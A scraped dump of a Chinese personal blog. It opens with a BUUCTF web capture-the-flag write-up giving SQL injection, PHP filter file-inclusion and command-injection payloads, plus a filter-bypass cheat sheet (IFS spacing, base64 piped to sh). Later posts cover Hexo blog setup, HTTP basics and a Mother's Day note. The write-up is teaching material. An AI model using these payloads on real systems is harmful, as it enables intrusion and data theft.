修改表名称：语法一： alter table tbl_name rename[to|as] new_tbl_name --可以更改一张数据表名称语法二：rename table tbl_name to new_tbl_name [,tbl_name2 TO new_tbl_namew…… --可以多表更改名称#添加表列alter table test add column name varchar(10); #删除表列alter table test drop column name; #修改表列类型alter table test modify address char(10) ||alter table test change address address char(40)#修改表列名alter table test change column address address1 varchar(30) 五、[SUCTF 2019]EasySQL1考点：堆叠注入、特殊语法 121# #数字型注入1;select database();# #查到数据库 ctf 尝试 堆叠注入 11;select database();(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;ctf&#x27;);# 没有获取到，有东西被过滤掉了，继续尝试 121;show database;# #查到所有数据库1;show tables;# #查到表 flag 紧接着当然会是想要查表 Flag 中的字段内容 11;show columns from Flag;# #查不到 这时因为Flag已经被过滤掉了，可以找个脚本跑一下，看看都被过滤了什么 这些都是被过滤掉的，可以发现 * 和 || 并没有被过滤 网上求解：貌似有说存在源码泄露的 index.php.swp ，其中包含一条查询代码 $sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;; 123456789101112131415161718192021222324252627&lt;?php if(isset($post[&#x27;query&#x27;]))&#123; $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile |readfile|where|from|union|update|delete|if|sleep|extractvalue| updatexml|or|and|&amp;|\\&quot;&quot;; //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#x27;query&#x27;])); if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#x27;query&#x27;]))&#123; //echo $post[&#x27;query&#x27;]; die(&quot;Nonono.&quot;); &#125; if(strlen($post[&#x27;query&#x27;])&gt;40)&#123; die(&quot;Too long.&quot;); &#125; $sql = &quot;select &quot;.$post[&#x27;query&#x27;].&quot;||flag from Flag&quot;; mysqli_multi_query($MysqlLink,$sql); do&#123; if($res = mysqli_store_result($MysqlLink))&#123; while($row = mysqli_fetch_row($res))&#123; print_r($row); &#125; &#125; &#125;while(@mysqli_next_result($MysqlLink)); &#125; ?&gt; 本地环境测试 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091mysql&gt; select * from emails;+----+------------------------+| id | email_id |+----+------------------------+| 1 | Dumb@dhakkan.com || 2 | Angel@iloveu.com || 3 | Dummy@dhakkan.local || 4 | secure@dhakkan.local || 5 | stupid@dhakkan.local || 6 | superman@dhakkan.local || 7 | batman@dhakkan.local || 8 | admin@dhakkan.com |+----+------------------------+8 rows in set (0.00 sec)mysql&gt; select 1 from emails;+---+| 1 |+---+| 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 |+---+mysql&gt; select 1,* from emails;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;* from emails&#x27; at line 1mysql&gt; select *,1 from emails;+----+------------------------+---+| id | email_id | 1 |+----+------------------------+---+| 1 | Dumb@dhakkan.com | 1 || 2 | Angel@iloveu.com | 1 || 3 | Dummy@dhakkan.local | 1 || 4 | secure@dhakkan.local | 1 || 5 | stupid@dhakkan.local | 1 || 6 | superman@dhakkan.local | 1 || 7 | batman@dhakkan.local | 1 || 8 | admin@dhakkan.com | 1 |+----+------------------------+---+8 rows in set (0.00 sec)mysql&gt; select *,1|1 from emails;+----+------------------------+-----+| id | email_id | 1|1 |+----+------------------------+-----+| 1 | Dumb@dhakkan.com | 1 || 2 | Angel@iloveu.com | 1 || 3 | Dummy@dhakkan.local | 1 || 4 | secure@dhakkan.local | 1 || 5 | stupid@dhakkan.local | 1 || 6 | superman@dhakkan.local | 1 || 7 | batman@dhakkan.local | 1 || 8 | admin@dhakkan.com | 1 |+----+------------------------+-----+8 rows in set (0.00 sec)mysql&gt; select *,1|email_id from emails;+----+------------------------+------------+| id | email_id | 1|email_id |+----+------------------------+------------+| 1 | Dumb@dhakkan.com | 1 || 2 | Angel@iloveu.com | 1 || 3 | Dummy@dhakkan.local | 1 || 4 | secure@dhakkan.local | 1 || 5 | stupid@dhakkan.local | 1 || 6 | superman@dhakkan.local | 1 || 7 | batman@dhakkan.local | 1 || 8 | admin@dhakkan.com | 1 |+----+------------------------+------------+8 rows in set, 8 warnings (0.00 sec)mysql&gt; select 1||email_id from emails;+-------------+| 1||email_id |+-------------+| 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 |+-------------+8 rows in set (0.00 sec) 构造 1*,1 #即语句为 $sql = &quot;select *,1||flag from Flag&quot;; 参考链接 六、[ACTF2020 新生赛]Include1考点：文件包含、php 伪协议 1?file=php://filter/read=convert.base64-encode/resource=flag.php 然后 base64 解码即可 尝试 php://input ，被过滤 12345?file=php://input&lt;?phpinclude(&quot;flag.php&quot;);?&gt; 七、[极客大挑战 2019]Secret File1考点：文件包含、源码泄露、php 伪协议 查看源代码或者是抓包可获取到 Archive_room.php 文件，访问 点击按钮再抓包，得到私密文件 secr3t.php 访问得到 123456789101112131415&lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag放在了flag.php里?&gt;&lt;/html&gt; 过滤掉了 tp、input、data 使用 php:filter// 伪协议 1?file=php://filter/read=convert.base64-encode/resource=flag.php 总结： 1234567891011strstr ( string $haystack , mixed $needle , bool $before_needle = false ) : string#返回 haystack 字符串从 needle 第一次出现的位置开始到 haystack 结尾的字符串。 #该函数区分大小写。如果想要不区分大小写，请使用 stristr()。 stristr() 函数搜索字符串在另一字符串中的第一次出现。查找 &quot;world&quot; 在 &quot;Hello world!&quot; 中的第一次出现，并返回字符串的剩余部分：&lt;?phpecho stristr(&quot;Hello world!&quot;,&quot;WORLD&quot;);?&gt; #返回：world! 八、[极客大挑战 2019]LoveSQL1考点：SQL 注入 之 联合查询、报错注入 123456789101&#x27; and 1=1#-1&#x27; union select 1,2,3#-1&#x27; union select 1,database(),3# #数据库 geek-1&#x27; union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;geek&#x27;)# #获取到表 geekuser,l0ve1ysq1-1&#x27; union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema = &#x27;geek&#x27; and table_name = &#x27;l0ve1ysq1&#x27;)# #获取到字段 id,username,password-1&#x27; union select 1,database(),(select group_concat(concat_ws(&#x27;~&#x27;,username,password)) from geek.l0ve1ysq1)# #获取到 flag 九、[ACTF2020 新生赛]Exec1考点：命令执行、||、|、&amp;、&amp;&amp; 123|whoami #www-data|pwd #/var/www/html|ls #index.php 1|ls/ #根目录下 1|cat /flag #得到 flag 十、[GXYCTF2019]Ping Ping Ping1考点：命令执行、空格、分隔符、变量覆盖、 123456|pwd #/var/www/html|ls #flag.php index.php|cat flag.php #fxck your space!|ls / #1fxck your symbol!|cat$IFS$1flag.php #fxck your flag! flag也被过滤|cat$IFS$1index.php #内容如下 123456789101112131415161718&lt;?phpif(isset($_GET[&#x27;ip&#x27;]))&#123; $ip = $_GET[&#x27;ip&#x27;]; if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;fxck your space!&quot;); &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123; die(&quot;fxck your bash!&quot;); &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;fxck your flag!&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&lt;pre&gt;&quot;; print_r($a);&#125;?&gt; 找到过过滤规则，构造 123456#变量覆盖?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php#内联执行 将反引号内命令的输出作为输入去执行?ip=127.0.0.1;cat$IFS$1`ls`;#sh 命令执行?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 总结： 123456789101112131415161718192021222324252627282930313233343536373839404142#空格绕过#Linux下1. $&#123;IFS&#125;替换2. $IFS$1替换3. $&#123;IFS替换4. %20替换5. &lt;和&lt;&gt;重定向符替换6. %09替换(需要php环境)#Windows下1. type.\\flag.txt2. type,flag.txt#cat绕过 常使用 tac(1)more:一页一页的显示档案内容(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页(3)head:查看头几行(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示(5)tail:查看尾几行(6)nl：显示的时候，顺便输出行号(7)od:以二进制的方式读取档案内容(8)vi:一种编辑器，这个也可以查看(9)vim:一种编辑器，这个也可以查看(10)sort:可以查看(11)uniq:可以查看(12)file -f:报错出具体内容(13)sed:一种编辑器，这个也可以查看(14)grep1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file (15)strings#变量绕过a=c;b=at;c=fl;d=ag;$a$b $c$d#base64 编码绕过echo &#x27;cat&#x27; | base64echo &#x27;Y2F0Cg==&#x27; | base64 -d test.txt#内联执行 将反引号内命令的输出作为输入去执行#bash、sh命令 # Y2F0IGZsYWcucGhw 内容是 cat flag.phpecho$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bashecho$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://xizhi-future.github.io/tags/BUUCTF/"}],"author":"xizhi-future"},{"title":"个人博客部署","slug":"个人博客部署","date":"2021-05-25T09:17:20.000Z","updated":"2021-07-09T11:08:08.918Z","comments":true,"path":"2021/05/25/个人博客部署/","link":"","permalink":"https://xizhi-future.github.io/2021/05/25/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2/","excerpt":"一、个人博客搭建 用Gridea+GitHub pages或Hexo+GitHub pages用到的 Git软件 有什么用？答：Git软件是一个用来上传 本地文件 到GitHub上的工具。用Git上传本地文件到GitHub后，GitHub的GitHub pages（静态站点托管服务）会建立一个可访问的站点并帮你管理这些文件，然后你就可以通过你在GitHub上设置的的域名来访问这个站点。","text":"一、个人博客搭建 用Gridea+GitHub pages或Hexo+GitHub pages用到的 Git软件 有什么用？答：Git软件是一个用来上传 本地文件 到GitHub上的工具。用Git上传本地文件到GitHub后，GitHub的GitHub pages（静态站点托管服务）会建立一个可访问的站点并帮你管理这些文件，然后你就可以通过你在GitHub上设置的的域名来访问这个站点。 Github Pages是面向用户、组织和项目开放的公共静态页面搭建托管服务，站点可以被免费托管在Github上，我们可以选择使用 Github Pages 默认提供的域名github.io 或者 自定义域名 来发布站点。Github Pages 支持自动利用 、Jekyll 生成站点，也同样支持纯 HTML 文档，将你的 Hexo站点托管在 Github Pages 上是一个不错的选择。 利用Hexo和GithubPages/CodingPages搭建博客，实际上就是利用Hexo在本地（你的电脑上）生成一个博客站点，然后把本地博客站点内容传输到Github/Coding上进行拷贝和备份。再由Github和Coding提供的GithubPages/CodingPages服务将博客部署到网上，这样你的博客就可以作为一个独立的站点被别人浏览（正式上线）。同时你也可以在Github和Coding上管理你的博客。 1.1 安装 nodejsnodejs 官网 12345node -vnmp -vnpm root -g创建 node_cache 和 node_global 两个文件夹npm config set cache &quot;D:\\网安实验室\\environment\\nodejs\\node_global&quot; 参考 1.2 注册 githubgithub 官网 1.3 下载 git for wingit for win 1.4 Git SSH 配置123在 gitfoewin 安装路径下打开 git-bash.exegit config --global user.name &quot;yourname&quot; #Github用户名git config --global user.email &quot;youremail&quot; #Github邮箱 123检查git config user.namegit config user.email 1输入命令：ssh-keygen -t rsa -C &quot;youremail&quot; 将会生成一个.ssh文件夹，找到它 将 id_rsa.pub 中地内容复制下来 然后进入你的github进行 SSH and GPG keys 配置，找到SSH keys的设置选项，点击New SSH key，把的id_rsa.pub里面的信息粘贴进去 测试是否配置成功 1输入 ssh -T git@github.com 1.5 HEXO 框架下载HEXO 官网 1234npm install hexo-cli -ghexo init xi-zhiBlog #初始化cd xi-zhiBlognpm install 安装依赖 12本地运行 hexo s -p 3333访问 http://localhost:3333/ 或者是 123hexo s出现默认的端口 访问即可出现以下 hexo 页面 1.6 新建文章测试1hexo new &quot;我的first blog&quot; 编写博客文档 清理 生成 12hexo cleanhexo g 1.7 将博客推送到 github 上 登录已经注册好的 Github ，创建新的仓库，名称必须是 username.github.io 安装 git 插件 1npm install hexo-deployer-git --save 修改博客配置文件 推送博客 123hexo clean #清理hexo generate #生成hexo deploy #部署 等待一会（或许会有些长。。。） 访问 https://username.github.io ，得到 1.8 安装 sublimesublime 官网 二、主题示例：yilia 1git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia 123hexo cleanhexo ghexo s 2.1 Fan2.1.1 主题下载下载主题模块 1git clone https://github.com/fan-lv/Fan.git themes/Fan 更改主题配置 1234# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: Fan 安装依赖包 1npm install --save hexo-renderer-jade hexo-renderer-stylus 注意 上面修改的是 themes\\Fan\\_config.yml 路径下的，而非 根目录下的 _config.yml ，修改完之后也许还会有 关于 评论的 报错，因为这时我们还未配置留言评论相关的配置，所以我们将其配置为空就可以了。 123hexo cleanhexo ghexo d 得到 2.1.2 创建新的博客1hexo new &quot;Lihux 命令&quot; 默认内容如下 我们可以自己配置 12345678title: xxxauthor: xxxtags: - xxxcategories: - xxxdate: xxxtop: 1 #表示需要置顶的文章，数值越大越靠前 2.1.3 评论与留言 在根目录下 _config.yml 文件中加入以下代码，[&quot;gitment&quot;, &quot;valine&quot;] 配置自行选择一个 1234567891011121314comments: gitment: enable: true owner: &#x27;Your GitHub ID&#x27; repo: &#x27;The repository to store your comments. Make sure you&#x27;re repo&#x27;s owner&#x27; client_id: &#x27;GitHub client ID&#x27; client_secret: &#x27;GitHub client secret&#x27; # 可以自由配置 valine 的其他配置项 valine: appId: &#x27;Your appId&#x27; appKey: &#x27;Your appKey&#x27; placeholder: &#x27;xxx&#x27; ...(valine配置项，参考链接 https://valine.js.org/configuration.html) themes -&gt; _config.yml 中可以开启或关闭 comments，并且通过 type 指定使用的评论插件 12345# 评论comments: enable: true # 使用哪种评论插件[&quot;gitment&quot;, &quot;valine&quot;] type: &quot;valine&quot; 2.1.4 增加 algolia 搜索功能注册algolia 新增api keys，重要的是在ACL里面增加删除和新增Object的权限 如图得到 安装扩展 1npm install hexo-algolia --save 增加根目录 _config.yml 配置 1234algolia: applicationID: &#x27;你的Application ID&#x27; apiKey: &#x27;你的Search-Only API Key&#x27; indexName: &#x27;输入刚才创建index name&#x27; 执行 123set HEXO_ALGOLIA_INDEXING_KEY=33ee877688fc550930bcca909f161863#Notes: Mac 和 git bash 为 export, Windows 为 set, Powershell 用 $envhexo algolia 发现已经提交 然后修改主题下的配置。更改为true 最后 123hexo cleanhexo ghexo d 2.2 Next提供写的很好的参考博客 https://blog.csdn.net/loze/article/details/94206726 http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html https://so.csdn.net/so/search?q=hexo%20next%20%E9%9F%B3%E4%B9%90&amp;t=&amp;u=&amp;fri= 2.3 Hiker下载源码 1git clone https://github.com/iTimeTraveler/hexo-theme-hiker.git themes/hiker 修改配置文件当中的 theme 更新 12cd themes/hikergit pull 搜索功能 https://blog.csdn.net/nineya_com/article/details/103338696 三、其它介绍3.1 创建博客123456hexo new [layout] &lt;title&gt; #博客的创建，[layout] 决定博客路径的不同hexo new paper #source/_postshexo new page board #source，访问链接变为 https://xxx.xxx/boardhexo new draft newpage #source/_draftshexo server --draft #将 draft 在本地预览hexo publish draft newpage #将 draft 发表到 post 中 3.2 菜单栏1234567891011121314151617181920212223242526272829#其中，About这个你是找不到网页的，因为你的文章中没有about这个东西。如果你想要的话，可以执行命令hexo new page about#它就会在根目录下source文件夹中新建了一个about文件夹，以及index.md，在index.md中写上你想要写的东西，就可以在网站上展示出来了。#想要自己再自定义一个菜单栏的选项hexo new page yourdiy#然后在主题配置文件的menu菜单栏添加一个 Yourdiy : /yourdiy，注意冒号后面要有空格，以及前面的空格要和menu中默认的保持整齐。然后在languages文件夹中，找到zh-CN.yml，在index中添加yourdiy: &#x27;中文意思&#x27;就可以显示中文了。#分类：hexo new page categories#进入source\\categories中，修改index.md---title: 分类date: 2021-05-24 00:03:00type: categories---#之后创建新的博客文章时在其最上面添加 categories: 名称 即可#标签：hexo new page tags#进入source\\categories中，修改index.md---title: 标签date: 2019-07-14 18:19:31type: &quot;tags&quot;---#之后创建新的博客文章时在其最上面添加 tags: -名称 即可 3.3 评论主题配置中修改：type 类型 12345# 评论comments: enable: true # 使用哪种评论插件[&quot;gitment&quot;, &quot;valine&quot;] type: gitment ：根目录配置文件中增加 gitment 注册页面 123456789101112comments: gitment: enable: true mint: true count: true lazy: true cleanly: true language: github_user: github_repo: client_id: client_serect: valine：根目录配置文件中增加 valine 注册页面 12345678910comments: valine: enable: true appid: appkey: notify: false verity: false placeholder: 留下你美好的足迹叭^-^! guest_info: nink,mail pageSize: 10 3.4 图床 腾讯云注册、创建对象存储 参考链接 获取密钥 地址 COSBrowser 官方文档 下载 PicGo 下载地址 使用 腾讯云 + Typora + PicGo : 文件— 偏好设置，如下图进行配置 对于 PicGo ，配置如下 最后点击上方的验证图片上传选项即可检验 第二种配置 点击下载或更新 访问下面链接，注册账号 1https://sm.ms/home/apitoken 然后访问下面链接 1https://sm.ms/home/apitoken 点击生成Token 然后点击Typora中的打开配置文件 123456789&#123; &quot;picBed&quot;: &#123; &quot;uploader&quot;: &quot;smms&quot;, &quot;smms&quot;: &#123; &quot;token&quot;: &quot;你上个页面的申请的token&quot; &#125; &#125;, &quot;picgoPlugins&quot;: &#123;&#125; &#125; 写入Token，保存 最后 验证图片上传选项进行验证 即可 四、参考链接next 主题配置官方 hexo 官方使用文档 Github + PicGo 参考 博客搭建全1 HEXO 博客搭建全 https://blog.csdn.net/nineya_com/article/details/103308963 hiker 主题界面设置 https://www.bilibili.com/video/BV1cW411A7Jx?p=4 https://blog.csdn.net/jspnetcn/article/details/104111651?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.baidujs","categories":[{"name":"博客部署","slug":"博客部署","permalink":"https://xizhi-future.github.io/categories/%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2/"}],"tags":[{"name":"博客","slug":"博客","permalink":"https://xizhi-future.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"Hexo","slug":"Hexo","permalink":"https://xizhi-future.github.io/tags/Hexo/"},{"name":"图床","slug":"图床","permalink":"https://xizhi-future.github.io/tags/%E5%9B%BE%E5%BA%8A/"}],"author":"xizhi-future"},{"title":"Web基础","slug":"Web基础","date":"2021-05-24T05:25:50.000Z","updated":"2021-07-09T07:26:11.425Z","comments":true,"path":"2021/05/24/Web基础/","link":"","permalink":"https://xizhi-future.github.io/2021/05/24/Web%E5%9F%BA%E7%A1%80/","excerpt":"攻击者攻击服务器–首先要保证两者之间能正常的进行通信如何通信？服务器上的各种服务都是依托于 端口 来实现对外提供服务的，攻击者所入侵的就是端口什么是Web应用？提供W e b服务的应用系统,其实通俗讲就是一个网站。","text":"攻击者攻击服务器–首先要保证两者之间能正常的进行通信如何通信？服务器上的各种服务都是依托于 端口 来实现对外提供服务的，攻击者所入侵的就是端口什么是Web应用？提供W e b服务的应用系统,其实通俗讲就是一个网站。 一、访问网页流程1.1 访问静态网页流程 编写：HTML , CSS , JavaScript 流程：在 浏 览 器 中 输 入h t t p : / / w w w . s e c u r i t y . c o m / a d m i n / i n d e x . h t m l 后 回 车，客户端向服务端发送HTTP请求报文，服务端通过运行其含有的Web应用服务器（Web容器，中间件）对接收到的请求进行处理–判断请求的文件扩展名，在网站的根目录之下寻找对应的文件，Web应用服务器再构建HTTP响应报文将文件源代码返回给浏览器，代码经过浏览器的渲染过后呈现的画面供客户端使用。 1.2 访问动态网页流程 编写：.php , .jsp , .asp , .aspx ，一般 由HTML+CSS+JavaScript+后端语言代码组成。 流程：判断请求文件扩展名之后，将会将对应的文件交给 PHP脚本引擎 去处理，使之解析文件当中的 PHP 代码，如果代码中涉及到队数据库的操作。它会请求相应的数据库，让数据库去执行队数据的增删改查等操作，然后将处理的结果返回给PHP脚本引擎。PHP脚本引擎将结果交给 Web 应用服务器（Apache），Web 应用服务器构建HTTP响应报文，由服务端发送给浏览器，经过解析之后，由客户端使用。 数据库：SQL Server , MySQL , Oracle 二、Web应用基本架构Web应用程序的设计者、Web应用服务器、动态脚本引擎(服务端程序语言)、数据库 常见Web服务端架构： LAMP和WAMP就是Windows/Linux+Apache+PHP+MySQL 三、URLURL：统一资源定位符（网页地址，网址），用于定位服务器的资源（文档，页面，图像等等） 标准格式 : protocol://userInfo@hostname[:port]/path/[?query]#fragment 真正访问的是@之后的地址 userInfo：user:password 不推荐 井号：在URL中指定的是页面中的一个位置 井号作为 页面定位符 出现在URL中，比如：http://www.httpwatch.com/features.htm#print ，此URL表示在页面features.htm中print的位置。浏览器读取这个URL后，会自动将print位置滚动至可视区域。 URL编码： 产生原因：一些特殊字符会含有不同而含义：?username=1&amp;passwd=2%263 ，为了区分。RFC标准提出 URL编码方案 常见： 123456789= %3d# %23% %25&amp; %26/ %2f空格 %20换行 %0a空字节 %00加号 + 代表URL编码当中的 空格 四、HTTPHTTP （HyperText Transfer Protocol）超文本传输协议（请求/响应协议）：规定浏览器与万维网服务器之间的通信规则。无状态的协议 4.1 HTTP 协议报文4.1.1 请求报文 请求行 ：请求方法 /URL /HTTP协议版本 空格隔离 请求头部：告知服务器客户端请求的信息，关键字:值，每行一对 123456Host 被请求资源的主机名User-Agent 产生请求的浏览器类型Accept 客户端可处理的 MIME 类型Accept-Encoding 客户端能够理解的内容编码方式Accept-Language 客户端可理解的语言Cookie 客户端身份凭证 Referer 重定向时，声明用户从什么地方（上一个URL）到达现在的URL的。例如：登陆页面，当用户登陆成功之后，HTTP请求报文中会有Referer字段–显示用户是从什么地方跳转到成功登录之后的界面的，服务端会进行检测，用于判断准确性。 Post方式：经常会有 Content-Type 和 Content-Length字段 空行 请求的数据 Get方式：没有请求正文，请求的数据在URL当中 Post方式：请求报文当中的最下面 4.1.2 响应报文 状态行 ： HTTP协议版本 状态码 状态描述 空格隔离 状态码： 123451xx 信息--服务器收到请求，需要请求者继续执行操作2xx 成功--操作成功被服务器接收并处理3xx 重定向--需要进一步操作才可完成请求4xx 客户端请求时错误5xx 服务端处理请求时错误 状态描述： 状态码 状态描述 说明 200 OK 请求成功 304 Not Modified 直接使用本地缓存 400 Bad Request 客户端请求语法错误，服务器无法理解 401 Unauthorized 请求未经授权 403 Forbidden 服务器收到请求但拒绝提供服务 404 Not Found 请求资源不存在 500 Internal Server Error 服务器发生了不可预知的错误 503 Server Unavaiable 服务器当前无法处理客户端的请求 响应头部：描述服务器信息 关键字:值，每行一对 1234567Date 请求发送的时间 日期Server 告知客户端服务器的名称与版本号Content-Type 响应正文的 MIME类型Content-Length 响应正文的长度Connection 告知客户端响应完成之后的连接状态Content-Encoding Web服务器告诉浏览器使用的是哪种压缩方法Last-Modified 指定资源的最后修改时间与日期 空行 响应正文 4.2 HTTP请求方法–8种服务端根据不同的请求方法做出不同的响应 GET , POST , HEAD , PUT , DELETE , OPTIONS , TRACE , CONNECT GET ：URL当中发送，有长度限制 POST ：在HTTP请求正文当中发送，无长度大小限制，可传递大量数据。 一般用于更新资源信息，向服务器提交数据。例如：登录，注册，修改资料，上传文件等等 安全性：不安全，黑客可获取，修改通信内容，冒充他人身份 解决：HTTPS协议（HyperText Transfer Prototol over Secure Socket Later）:在HTTP基础上加了 SSL/TLS层。 五、会话技术盗取 Cookie 会话劫持 产生原因：HTTP协议是无连接，无状态的，无法记住客户端的信息。于是产生了会话技术：Session , cookie **Cookie : **由服务端生成，由服务器将数据通过HTTP响应储存到浏览器上，则浏览器在以后就可直接携带上这个 Cookie 访问该服务器。 客户端第一次请求：PHP 的 setcookie 函数 将 cookie数据 通过HTTP协议与响应头传给浏览器，浏览器第一次响应时将Cookie数据保存到浏览器上。 客户端再次发送请求：首先自动检测本地是否存在Cookie数据，若存在，直接在请求头当中将Cookie数据发送给服务器；PHP执行自动判断浏览器请求中是否携带Cookie，有的话，自动保存到 $_COOKIE 当中；利用 $ _COOKIE 访问 Cookie数据。 **Session : **与浏览器无关，以Cookie为基础，将重要的数据保存到服务端，同时将能够唯一表示这个数据的数据以COOKIE的形式保存在客户端。 客户端第一次请求：创建 SESSIONID ；初始化超全局变量 $_SESSION；在php指定目录创建SESSIONId为名的文件；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SessionID对应的文件中。并 将SESSIONID以SETCOOKIE的形式返回给客户端，相当于 将SESSIONID 写入 COOKIE 当中。 客户端再次发送请求：检测到 客户端的COOKIE中的SESSIONID ；初始化超全局变量$_SESSION；找到文件，反序列化读取数据存储到$_SESSION中；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SESSIONID对应的文件中。 登陆判断： 用户成功登录之后，服务器通过 SESSION机制 将用户信息存储到服务端，并将 SESSIONID 以 SETCOOKIE 的形式返回给客户端。 用户下一次访问站点时，自动携带COOKIE信息，服务端根据COOKIE当中的 SESSIONID 进行数据匹配，存在证明已登录过。 六、JWT 原理JWT 原理 JSON Web Token，服务器认证之后，会生成一个 JSON对象，比如： 12345&#123; &quot;姓名&quot;: &quot;张三&quot;, &quot;角色&quot;: &quot;管理员&quot;, &quot;到期时间&quot;: &quot;2018年7月1日0点0分&quot;&#125; 用户每次与服务端通信的时候都要发回这个 JSON对象，服务器就通过这个对象来认证用户身份。为防止用户篡改数据，服务器在生成这个对象时，会加上一个 签名。 JWT 组成：Header.Payload.Signature Header：头部用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等 Payload：载荷就是存放有效信息的地方，即用来存放实际需要传递的数据—标准中注册的声明，公共的声明，私有的声明 Signature：这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密","categories":[{"name":"Web基础篇","slug":"Web基础篇","permalink":"https://xizhi-future.github.io/categories/Web%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"Web应用基本架构","slug":"Web应用基本架构","permalink":"https://xizhi-future.github.io/tags/Web%E5%BA%94%E7%94%A8%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84/"},{"name":"HTTP","slug":"HTTP","permalink":"https://xizhi-future.github.io/tags/HTTP/"},{"name":"会话技术","slug":"会话技术","permalink":"https://xizhi-future.github.io/tags/%E4%BC%9A%E8%AF%9D%E6%8A%80%E6%9C%AF/"}],"author":"xizhi-future"},{"title":"2021年的母亲节","slug":"2021年的母亲节","date":"2021-05-09T11:25:17.000Z","updated":"2021-10-01T11:33:16.379Z","comments":true,"path":"2021/05/09/2021年的母亲节/","link":"","permalink":"https://xizhi-future.github.io/2021/05/09/2021%E5%B9%B4%E7%9A%84%E6%AF%8D%E4%BA%B2%E8%8A%82/","excerpt":"","text":"​ 从前我总是不曾在意一些节日，就连身边人的生日也从不上心，也许是离家久了，也许了自己长大了许多，也许是自己在害怕些什么，也许是自己突然意识到某些东西它并不是一成不变的，到了今年今日，我再也无法对这些节日避讳，我意识到，今天过后，我需要做出一些改变。 ​ 以下是我想对她说的话： 母亲节到了，你要当一个乖一点的妈妈，多陪我聊聊天；多学着做一些好吃的饭；多多把我的房间打扫的干干净净；多多听一些我推荐给你的歌；多多听我劳力唠叨，抱怨这抱怨那；多多听我讲我好想讲的话，关于歌手的，关于明星的，关于电视剧的，关于电影的，关于杰哥的，关于学校的，关于朋友的，关于我遇到的好多好多事；多多给我一些预料不到的好吃的；多多身体好一些；多多快乐一些；多多在全民K歌上唱歌；多多和朋友出去散心；多多表达出自己的感情；多多对自己好一点；少吃点泡面，多吃些肉；多多吃你最爱的苹果；多多喝热水；早点睡，晚点起；少想那些乱七八糟的；不用担心我，不用考虑未来（反正一定是跟我在一起的）；就这样吧，也说的挺多了，反正就是，你要记得，做一个乖一点的妈妈哦！ 